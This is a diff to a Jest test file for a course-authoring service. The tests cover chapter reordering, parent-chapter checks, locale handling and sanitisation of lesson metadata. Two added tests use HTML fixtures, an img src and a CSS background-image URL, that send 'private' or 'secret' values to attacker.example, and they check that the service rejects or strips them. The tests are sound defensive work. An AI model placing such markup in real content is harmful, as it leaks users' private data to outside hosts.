@@ -82,10 +82,30 @@ describe("CourseAuthoringApplyService reviewed assessment guard", () => {
   beforeAll(() => FormatRegistry.Set("uuid", validate));
   function setup() {
     const persistedLessonType = jest.fn().mockReturnValue("quiz");
+    let lessonRowsSelected = false;
+    const readChapters = jest.fn().mockResolvedValue([{ id: chapterId }]);
+    const readLessons = jest.fn().mockImplementation(async () => [
+      { id: lessonId, chapterId },
+      ...createLessonForChapter.mock.calls.map(([input]) => ({
+        id: operationId,
+        chapterId: input.chapterId,
+      })),
+      ...createAiMentorLesson.mock.calls.map(([input]) => ({
+        id: operationId,
+        chapterId: input.chapterId,
+      })),
+      ...saveQuizFromAuthoring.mock.calls.map(([input]) => ({
+        id: operationId,
+        chapterId: input.chapterId,
+      })),
+    ]);
     const query = {
       from: jest.fn(),
       innerJoin: jest.fn(),
       where: jest.fn(),
+      orderBy: jest
+        .fn()
+        .mockImplementation(() => (lessonRowsSelected ? readLessons() : readChapters())),
       for: jest.fn().mockResolvedValue([]),
       *[Symbol.iterator]() {
         yield { id: chapterId, description: "", type: persistedLessonType() };
@@ -100,11 +120,10 @@ describe("CourseAuthoringApplyService reviewed assessment guard", () => {
     countQuery.where.mockImplementation(async () => [{ value: persistedLessonCount() }]);
     const transaction = {
       execute: jest.fn(),
-      select: jest
-        .fn()
-        .mockImplementation((fields: Record<string, unknown>) =>
-          "value" in fields ? countQuery : query,
-        ),
+      select: jest.fn().mockImplementation((fields: Record<string, unknown>) => {
+        lessonRowsSelected = "chapterId" in fields;
+        return "value" in fields ? countQuery : query;
+      }),
     };
     const context = {
       authorize: jest.fn(),
@@ -130,7 +149,8 @@ describe("CourseAuthoringApplyService reviewed assessment guard", () => {
     };
     const removeLesson = jest.fn();
     const removeChapter = jest.fn();
-    const createChapterForCourse = jest.fn();
+    const updateChapter = jest.fn();
+    const createChapterForCourse = jest.fn().mockResolvedValue({ id: chapterId });
     const updateChapterDisplayOrder = jest.fn();
     const createLessonForChapter = jest.fn().mockResolvedValue(operationId);
     const createAiMentorLesson = jest.fn().mockResolvedValue(operationId);
@@ -156,6 +176,7 @@ describe("CourseAuthoringApplyService reviewed assessment guard", () => {
       { applyOnce } as unknown as Dependencies[2],
       {
         removeChapter,
+        updateChapter,
         createChapterForCourse,
         updateChapterDisplayOrder,
       } as unknown as Dependencies[3],
@@ -192,6 +213,8 @@ describe("CourseAuthoringApplyService reviewed assessment guard", () => {
       service,
       persistedLessonCount,
       persistedLessonType,
+      readChapters,
+      readLessons,
       input,
       context,
       removeLesson,
@@ -254,7 +277,10 @@ describe("CourseAuthoringApplyService reviewed assessment guard", () => {
           move(lessons, id, displayOrder);
         },
       );
-      test.persistedLessonCount.mockImplementation(() => lessons.length);
+      test.readChapters.mockImplementation(async () => chapters.map((id) => ({ id })));
+      test.readLessons.mockImplementation(async () =>
+        lessons.map((id) => ({ id, chapterId: chapterIds[0] })),
+      );
       test.input.operations = arrivalOrder.flatMap((index) => [
         {
           type: "chapter.create" as const,
@@ -284,9 +310,84 @@ describe("CourseAuthoringApplyService reviewed assessment guard", () => {
       await test.service.applyPreparedExport(test.input, actor);
       expect(chapters).toEqual(chapterIds.filter((_, index) => arrivalOrder.includes(index)));
       expect(lessons).toEqual(lessonIds.filter((_, index) => arrivalOrder.includes(index)));
-      expect(test.persistedLessonCount).toHaveBeenCalledTimes(1);
+      expect(test.readChapters).toHaveBeenCalledTimes(1);
+      expect(test.readLessons).toHaveBeenCalledTimes(1);
     },
   );
+
+  it("applies a simultaneous right-moving layout without shifting earlier requested slots", async () => {
+    const test = setup();
+    const ids = [7, 8, 9, 10].map(
+      (index) => `00000000-0000-4000-8000-${String(index).padStart(12, "0")}`,
+    );
+    const nativeOrder = [...ids];
+    test.context.getContext.mockResolvedValue({
+      baselineHash: "course",
+      fieldHashes: {},
+      chapters: ids.map((id) => ({ id, baselineHash: "b".repeat(64), lessons: [] })),
+    });
+    test.readChapters.mockImplementation(async () => nativeOrder.map((id) => ({ id })));
+    test.readLessons.mockResolvedValue([]);
+    test.updateChapterDisplayOrder.mockImplementation(
+      async ({ chapterId: id, displayOrder }: { chapterId: string; displayOrder: number }) => {
+        nativeOrder.splice(nativeOrder.indexOf(id), 1);
+        nativeOrder.splice(displayOrder - 1, 0, id);
+      },
+    );
+    test.input.operations = ids.slice(0, 2).map((id, index) => ({
+      type: "chapter.update",
+      operationId: id,
+      targetId: id,
+      baselineHash: "b".repeat(64),
+      language: "en",
+      dependencies: [],
+      payload: { title: "Updated title", displayOrder: index + 2 },
+    }));
+    await test.service.applyPreparedExport(test.input, actor);
+    expect(nativeOrder).toEqual([ids[2], ids[3], ids[0], ids[1]]);
+    expect(test.updateChapterDisplayOrder).toHaveBeenCalledTimes(4);
+  });
+
+  it("rejects a lesson update claiming another existing chapter as its parent", async () => {
+    const test = setup();
+    const otherChapterId = "00000000-0000-4000-8000-000000000007";
+    test.context.getContext.mockResolvedValue({
+      baselineHash: "course",
+      fieldHashes: {},
+      chapters: [
+        {
+          id: chapterId,
+          baselineHash: "a".repeat(64),
+          lessons: [
+            {
+              id: lessonId,
+              baselineHash: "b".repeat(64),
+              lessonType: "content",
+              assessmentAttemptCount: 0,
+            },
+          ],
+        },
+        { id: otherChapterId, baselineHash: "a".repeat(64), lessons: [] },
+      ],
+    });
+    test.input.operations = [
+      {
+        type: "lesson.update",
+        operationId,
+        targetId: lessonId,
+        chapterId: otherChapterId,
+        baselineHash: "b".repeat(64),
+        language: "en",
+        dependencies: [],
+        payload: { lessonType: "content", title: "Unchanged", description: "<p>Content</p>" },
+      },
+    ];
+    await expect(test.service.applyPreparedExport(test.input, actor)).rejects.toThrow(
+      "courseAuthoring.errors.targetOutsideCourse",
+    );
+    expect(test.updateLesson).not.toHaveBeenCalled();
+    expect(test.updateLessonDisplayOrder).not.toHaveBeenCalled();
+  });
 
   it.each(["quiz", "ai_mentor"])(
     "renames %s without rebuilding its teaching configuration",
@@ -315,6 +416,63 @@ describe("CourseAuthoringApplyService reviewed assessment guard", () => {
       expect(test.assignDocumentToAiMentorLesson).not.toHaveBeenCalled();
       expect(test.replaceCourseAuthoringMentorContext).not.toHaveBeenCalled();
       expect(test.updateLessonDisplayOrder).not.toHaveBeenCalled();
+    },
+  );
+  it.each(["content", "quiz"])(
+    "rejects invented remote media in %s metadata before native content writes",
+    async (lessonType) => {
+      const test = setup();
+      test.persistedLessonType.mockReturnValue(lessonType);
+      test.input.operations = [
+        {
+          type: "lesson.metadata.update",
+          operationId,
+          targetId: lessonId,
+          language: "en",
+          baselineHash: "b".repeat(64),
+          dependencies: [],
+          payload: { description: '<img src="https://attacker.example/?private=context">' },
+        },
+      ];
+      await expect(test.service.applyPreparedExport(test.input, actor)).rejects.toThrow(
+        "courseAuthoring.errors.mediaOutsideCourse",
+      );
+      expect(test.updateLesson).not.toHaveBeenCalled();
+      expect(test.createLessonResources).not.toHaveBeenCalled();
+    },
+  );
+  it.each(["content", "quiz"])(
+    "strips automatic CSS requests before persisting %s metadata",
+    async (lessonType) => {
+      const test = setup();
+      test.persistedLessonType.mockReturnValue(lessonType);
+      test.input.operations = [
+        {
+          type: "lesson.metadata.update",
+          operationId,
+          targetId: lessonId,
+          language: "en",
+          baselineHash: "b".repeat(64),
+          dependencies: [],
+          payload: {
+            description:
+              '<p style="background-image:url(https://attacker.example/?private=secret)">Introduction</p>',
+          },
+        },
+      ];
+      await test.service.applyPreparedExport(test.input, actor);
+      expect(test.updateLesson).toHaveBeenCalledWith(
+        lessonId,
+        {
+          language: "en",
+          description:
+            lessonType === "content"
+              ? expect.stringContaining("Introduction")
+              : "<p>Introduction</p>",
+        },
+        actor,
+      );
+      expect(test.updateLesson.mock.calls[0][1].description).not.toContain("attacker.example");
     },
   );
   it("normalizes content metadata images through native lesson resources", async () => {
@@ -472,6 +630,7 @@ describe("CourseAuthoringApplyService reviewed assessment guard", () => {
     expect(test.createLessonForChapter).toHaveBeenCalledWith(
       { chapterId, type: "content", title: "Asset lesson", description: "" },
       actor,
+      "en",
     );
     expect(test.createLessonForChapter.mock.invocationCallOrder[0]).toBeLessThan(
       test.createLessonResources.mock.invocationCallOrder[0],
@@ -521,6 +680,7 @@ describe("CourseAuthoringApplyService reviewed assessment guard", () => {
         chapterId,
         displayOrder: 0,
         baselineHash: null,
+        language: "pl",
         payload: {
           ...fixture.payload,
           attemptsLimit: 3,
@@ -536,9 +696,57 @@ describe("CourseAuthoringApplyService reviewed assessment guard", () => {
     await test.service.applyPreparedExport(test.input, actor);
 
     expect(test.saveQuizFromAuthoring).toHaveBeenCalledWith(
-      expect.objectContaining({ attemptsLimit: 3, quizCooldownInHours: null }),
+      expect.objectContaining({ attemptsLimit: 3, quizCooldownInHours: null, language: "pl" }),
       actor,
       undefined,
+    );
+  });
+
+  it("creates chapters in the operation locale", async () => {
+    const test = setup();
+    test.input.operations = [
+      {
+        type: "chapter.create",
+        operationId,
+        targetId: operationId,
+        language: "pl",
+        baselineHash: null,
+        dependencies: [],
+        payload: { title: "Rozdział", displayOrder: 0 },
+      },
+    ];
+
+    await test.service.applyPreparedExport(test.input, actor);
+
+    expect(test.createChapterForCourse).toHaveBeenCalledWith(
+      { courseId, title: "Rozdział" },
+      actor,
+      "pl",
+    );
+  });
+
+  it("creates content lessons in the operation locale", async () => {
+    const test = setup();
+    test.input.operations = [
+      {
+        type: "lesson.create",
+        operationId,
+        targetId: operationId,
+        chapterId,
+        displayOrder: 0,
+        language: "pl",
+        baselineHash: null,
+        dependencies: [],
+        payload: { lessonType: "content", title: "Lekcja", description: "<p>Treść</p>" },
+      },
+    ];
+
+    await test.service.applyPreparedExport(test.input, actor);
+
+    expect(test.createLessonForChapter).toHaveBeenCalledWith(
+      { chapterId, type: "content", title: "Lekcja", description: "" },
+      actor,
+      "pl",
     );
   });
 
@@ -551,7 +759,7 @@ describe("CourseAuthoringApplyService reviewed assessment guard", () => {
       chapterId,
       displayOrder: 0,
       baselineHash: null,
-      language: "en",
+      language: "pl",
       dependencies: [],
       payload: {
         lessonType: "ai_mentor",
@@ -598,6 +806,7 @@ describe("CourseAuthoringApplyService reviewed assessment guard", () => {
     expect(test.createAiMentorLesson).toHaveBeenCalledWith(
       expect.objectContaining({ title: "Course coach" }),
       actor,
+      "pl",
     );
     expect(test.replaceCourseAuthoringMentorContext).toHaveBeenCalledWith(
       [preparedContextId],
